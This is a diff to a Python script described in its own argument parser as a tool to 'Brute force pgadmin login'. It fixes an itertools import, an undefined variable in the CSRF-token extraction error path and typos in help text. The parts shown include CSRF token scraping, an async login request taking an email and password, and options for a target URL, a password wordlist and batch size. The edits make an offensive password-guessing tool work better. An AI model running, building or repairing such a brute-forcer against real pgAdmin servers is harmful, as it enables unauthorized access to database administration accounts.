@@ -23,7 +23,7 @@ def grouper(iterable, n, *, incomplete='fill', fillvalue=None):
 
     match incomplete:
         case 'fill':
-            return zip_longest(*args, fillvalue=fillvalue)
+            return itertools.zip_longest(*args, fillvalue=fillvalue)
         case 'strict':
             return zip(*args, strict=True)
         case 'ignore':
@@ -38,7 +38,7 @@ def get_csft_token(text):
     if match := re.search(CSRF_REGEX, str(script)):
         return match.group().split('"')[-2]
     else:
-        raise Exception(response.text)
+        raise Exception(text)
 
 
 async def make_request(session, url, email, password):
@@ -78,10 +78,10 @@ async def main(args):
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Brute force pgadmin login')
-    parser.add_argument('-u', '--url', required=True, help='Target URL (http://pgadmin.sime)')
+    parser.add_argument('-u', '--url', required=True, help='Target URL (http://pgadmin.site)')
     parser.add_argument('-e', '--email', required=True, help='Email address for login')
     parser.add_argument('-w', '--wordlist', required=True, type=argparse.FileType('r'), help='Path to the wordlist file')
-    parser.add_argument('-b', '--batch', type=int, default=50, help='Срусл passwords in n batches')
+    parser.add_argument('-b', '--batch', type=int, default=50, help='Count passwords in n batches')
     args = parser.parse_args()
 
     try:
